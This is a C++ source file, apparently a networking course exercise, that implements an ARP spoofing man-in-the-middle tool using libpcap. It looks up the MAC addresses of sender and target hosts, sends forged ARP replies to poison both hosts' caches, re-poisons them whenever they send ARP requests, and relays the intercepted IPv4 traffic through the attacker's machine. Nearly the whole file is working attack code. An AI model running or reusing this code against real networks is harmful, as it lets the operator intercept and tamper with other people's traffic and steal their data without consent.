#include "ethhdr.h"
#include "arphdr.h"
#include "arputils.h"
#include <netinet/ip.h>
#include <pcap.h>
#include <iostream>
#include <map>
#include <vector>
#include <cstring>

using namespace std;

static map<string, string> IP_MAC;
static map<string, string> sen_tar;

static char my_mac[18];
static char my_ip[16];

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2 == 1)) {
        usage();
        return -1;
    }

    uint8_t inface_mac[6];
    uint8_t interface_ip[4];

    char sender_mac[18];
    char sender_ip[15];
    char target_mac[18];
    char target_ip[15];

    char* dev = argv[1];

    get_MAC_IP_Address(dev, inface_mac, interface_ip);

    cout << "----my address----" << endl;
    printf("my mac : %s\n", my_mac);
    printf("my ip : %s\n", my_ip);
    int cnt = (argc - 2) / 2;
    cout << "------------------" << endl;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
        return -1;
    }

    for (int i = 0; i < cnt; i++) {
        strcpy(sender_ip, argv[2 + (i * 2)]);
        strcpy(target_ip, argv[3 + (i * 2)]);
        string str_sender_ip(argv[2 + (i * 2)]);
        string str_target_ip(argv[3 + (i * 2)]);
        sen_tar.insert({str_sender_ip, str_target_ip});

        cout << endl << "----Ip_info----" << endl;
        cout << "sender_ip : " << sender_ip << endl;
        cout << "target_ip : " << target_ip << endl;
        cout << "---------------" << endl;

        check_IP_get_MAC(handle, sender_ip, target_ip, sender_mac, target_mac);

        formatMacAddress(sender_mac);
        formatMacAddress(target_mac);

        cout << endl << "-------attack_" << i + 1 << "--------" << endl;
        printf("sender mac : %s\n", sender_mac);
        printf("sender ip : %s\n", sender_ip);
        printf("target mac : %s\n", target_mac);
        printf("target ip : %s\n", target_ip);

        send_attack_ARP(handle, my_mac, sender_mac, target_ip, sender_ip);
        send_attack_ARP(handle, my_mac, target_mac, sender_ip, target_ip);

        cout << "---attack finished---" << endl;
    }

    relay_packets(handle);

    cout << endl << endl << "------print map-------" << endl;
    for (const auto& pair : IP_MAC) {
        cout << "IP: " << pair.first << ", MAC: " << pair.second << endl;
    }
    cout << "----------------------" << endl;

    cout << endl << endl << "------print map-------" << endl;
    for (const auto& pair : sen_tar) {
        cout << "IP: " << pair.first << ", MAC: " << pair.second << endl;
    }
    cout << "----------------------" << endl;

    pcap_close(handle);
    return 0;
}

void relay_packets(pcap_t* handle) {
    struct pcap_pkthdr* header;
    const u_char* packet;

    while (true) {
        int res = pcap_next_ex(handle, &header, &packet);

        EthHdr* eth_hdr = (EthHdr*)(packet);

        if (eth_hdr->type() == EthHdr::Ip4) {


            iphdr* ip_hdr =(iphdr*)(packet + sizeof(EthHdr));
            char dest_ip[16];
            inet_ntop(AF_INET, &ip_hdr->daddr, dest_ip, sizeof(dest_ip));

            auto it = IP_MAC.find(dest_ip);
            if (it != IP_MAC.end()) {
                string mac_obj_str = it->second;
                formatMacAddress(mac_obj_str);

                eth_hdr->dmac_ = Mac(mac_obj_str);
                eth_hdr->smac_ = Mac(my_mac);
                
                if (pcap_sendpacket(handle, packet, header->caplen) != 0) {
                    fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
                } else {
                    printf("Packet relayed successfully to %s with MAC %s\n", dest_ip, mac_obj_str.c_str());
                }
            }
        }else if (eth_hdr->type() == EthHdr::Arp) {
            EthArpPacket* arp_packet = (EthArpPacket*)(packet);

            if ( arp_packet->arp_.op() == ArpHdr::Request) {
                char sender_ip[16];
                inet_ntop(AF_INET, &arp_packet->arp_.sip_, sender_ip, sizeof(sender_ip));

                // sender가 감염된 기기인지 검증
                auto sen_tar_it = sen_tar.find(sender_ip);
                if (sen_tar_it != sen_tar.end()) {
                    std::string target_ip = sen_tar_it->second;
                    auto it = IP_MAC.find(target_ip);
                    if (it != IP_MAC.end()) {
                        EthArpPacket attack_packet;
                        attack_packet.eth_.dmac_ = arp_packet->eth_.smac_;
                        attack_packet.eth_.smac_ = Mac(my_mac);
                        attack_packet.eth_.type_ = htons(EthHdr::Arp);

                        attack_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
                        attack_packet.arp_.pro_ = htons(EthHdr::Ip4);
                        attack_packet.arp_.hln_ = Mac::SIZE;
                        attack_packet.arp_.pln_ = sizeof(uint32_t);
                        attack_packet.arp_.op_ = htons(ArpHdr::Reply);
                        attack_packet.arp_.smac_ = Mac(my_mac);
                        attack_packet.arp_.sip_ = arp_packet->arp_.tip_;
                        attack_packet.arp_.tmac_ = arp_packet->arp_.smac_;
                        attack_packet.arp_.tip_ = arp_packet->arp_.sip_;

                        if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket)) != 0) {
                            fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
                        } else {
                            printf("ARP attack packet sent to %s\n", sender_ip);
                        }
                    }
                }
            }
        }
    }
}



void usage() {
    printf("syntax: send-arp-test <interface> <target-ip>\n");
    printf("sample: send-arp-test wlan0 192.168.0.1\n");
}

void padMacAddress(uint8_t* mac, char* formattedMac) {
    snprintf(formattedMac, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

void formatMacAddress(string& mac) {
    vector<string> segments;
    string segment;

    for (char ch : mac) {
        if (ch == ':') {
            if (segment.size() == 1) {
                segment = "0" + segment;
            }
            segments.push_back(segment);
            segment.clear();
        } else {
            segment += ch;
        }
    }

    if (segment.size() == 1) {
        segment = "0" + segment;
    }
    segments.push_back(segment);

    while (segments.size() < 6) {
        segments.push_back("00");
    }

    mac.clear();
    for (size_t i = 0; i < segments.size(); ++i) {
        mac += segments[i];
        if (i < segments.size() - 1) {
            mac += ":";
        }
    }
}

void formatMacAddress(char* mac) {
    char segments[6][3] = {0};
    int segmentIndex = 0;
    const char* token = mac;
    char formattedMac[18];
    char segment[3];

    while (*token) {
        int length = 0;

        while (*token && *token != ':' && length < 2) {
            segment[length++] = *token++;
        }
        segment[length] = '\0';

        if (length == 1) {
            segments[segmentIndex][0] = '0';
            segments[segmentIndex][1] = segment[0];
        } else {
            strcpy(segments[segmentIndex], segment);
        }

        segmentIndex++;
        if (*token == ':') {
            token++;
        }
    }
    snprintf(formattedMac, 18, "%s:%s:%s:%s:%s:%s",
             segments[0], segments[1], segments[2],
             segments[3], segments[4], segments[5]);
    memcpy(mac, formattedMac, 18);
}

void get_MAC_IP_Address(const char* iface, uint8_t* mac, uint8_t* ip) {
    struct ifreq ifr;
    int fd;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(fd);
        exit(EXIT_FAILURE);
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
        perror("ioctl");
        close(fd);
        exit(EXIT_FAILURE);
    }
    struct sockaddr_in* ipaddr = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
    memcpy(ip, &ipaddr->sin_addr.s_addr, sizeof(ipaddr->sin_addr.s_addr));

    sprintf(my_mac, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2],
            mac[3], mac[4], mac[5]);
    sprintf(my_ip, "%d.%d.%d.%d",
            ip[0], ip[1], ip[2], ip[3]);

    close(fd);
}

void get_mac_address(pcap_t* handle, char* my_mac, char* my_ip, char* sender_ip, char* mac) {
    EthArpPacket to_send_packet;

    to_send_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    to_send_packet.eth_.smac_ = Mac(my_mac);
    to_send_packet.eth_.type_ = htons(EthHdr::Arp);

    to_send_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    to_send_packet.arp_.pro_ = htons(EthHdr::Ip4);
    to_send_packet.arp_.hln_ = Mac::SIZE;
    to_send_packet.arp_.pln_ = Ip::SIZE;
    to_send_packet.arp_.op_ = htons(ArpHdr::Request);
    to_send_packet.arp_.smac_ = Mac(my_mac);
    to_send_packet.arp_.sip_ = htonl(Ip(my_ip));
    to_send_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    to_send_packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res;
    for(int i = 0 ; i < 3; i++){
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&to_send_packet), sizeof(EthArpPacket));
        sleep(1);
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }

    char sender_mac[18];
    struct pcap_pkthdr* header;
    const u_char* reply_packet;

    while (true) {
        int ret = pcap_next_ex(handle, &header, &reply_packet);
        if (ret == 1) {
            EthArpPacket* reply = (EthArpPacket*)reply_packet;
            if (reply->eth_.type() == EthHdr::Arp &&
                Ip(sender_ip) == reply->arp_.sip()) {
                ether_ntoa_r((const struct ether_addr*)&reply->eth_.smac_, sender_mac);
                break;
            }
        } else {
            fprintf(stderr, "pcap_next_ex return %d error=%s\n", ret, pcap_geterr(handle));
        }
    }
    memcpy(mac, sender_mac, 18);
}

void send_attack_ARP(pcap_t* handle, char* my_mac, char* sender_mac, char* target_ip, char* sender_ip) {
    EthArpPacket attack_packet;

    attack_packet.eth_.dmac_ = Mac(sender_mac);
    attack_packet.eth_.smac_ = Mac(my_mac);
    attack_packet.eth_.type_ = htons(EthHdr::Arp);

    attack_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    attack_packet.arp_.pro_ = htons(EthHdr::Ip4);
    attack_packet.arp_.hln_ = Mac::SIZE;
    attack_packet.arp_.pln_ = Ip::SIZE;
    attack_packet.arp_.op_ = htons(ArpHdr::Reply);
    attack_packet.arp_.smac_ = Mac(my_mac);
    attack_packet.arp_.sip_ = htonl(Ip(target_ip));
    attack_packet.arp_.tmac_ = Mac(sender_mac);
    attack_packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket));
    if (res2 != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
    }
}

void check_IP_get_MAC(pcap_t* handle, char* sender_ip, char* target_ip, char* sender_mac, char* target_mac) {
    string tmp_ip;
    string tmp_mac;

    tmp_ip = sender_ip;
    if (IP_MAC.count(tmp_ip)) {
        strcpy(sender_mac, IP_MAC[sender_ip].c_str());
    } else {
        get_mac_address(handle, my_mac, my_ip, sender_ip, sender_mac);
        tmp_mac = sender_mac;
        IP_MAC.insert({tmp_ip, tmp_mac});
    }

    tmp_ip = target_ip;
    if (IP_MAC.count(tmp_ip)) {
        strcpy(target_mac, IP_MAC[tmp_ip].c_str());
    } else {
        get_mac_address(handle, my_mac, my_ip, target_ip, target_mac);
        tmp_mac = target_mac;
        IP_MAC.insert({tmp_ip, tmp_mac});
    }
}
